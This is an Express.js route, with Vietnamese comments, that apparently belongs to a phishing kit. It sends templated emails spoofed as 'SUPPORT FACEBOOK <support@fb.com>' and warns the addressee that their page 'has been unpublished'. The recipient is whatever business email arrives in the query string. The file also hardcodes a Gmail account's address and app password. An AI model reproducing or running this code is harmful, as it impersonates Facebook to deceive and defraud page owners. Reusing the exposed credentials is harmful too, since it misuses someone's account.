const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
const hbs = require("nodemailer-express-handlebars");

router.get("/send-email", (req, res) => {
  console.log(req.body,"----------------------");
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: "phamminhankfs13@gmail.com", // Điền email của bạn
      pass: "hshzgsizikxatayl", // Điền mật khẩu của bạn
    },
  });
  transporter.use(
    "compile",
    hbs({
      viewEngine: {
        extName: ".hbs",
        partialsDir: process.cwd() + "/templates",
        layoutsDir: process.cwd() + "/templates",
        defaultLayout: "",
      },
      viewPath: process.cwd() + "/templates",
      extName: ".hbs",
    })
  );
  const mailOptions = {
    from: " SUPPORT FACEBOOK <support@fb.com>",
    to: req.query?.BussinessEmail,
    subject: `Your page has been unpublished.`,
    text: "WARNING",
    template: "./email",
    context: {
      BussinessEmail: req.query?.BussinessEmail,
      TimeSend: req.query?.TimeSend,
    },
  };

  // Gửi email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      res.send("Error sending email");
    } else {
      console.log("Email sent:", info.response);
      res.send("Email sent successfully");
    }
  });
});

module.exports = router;
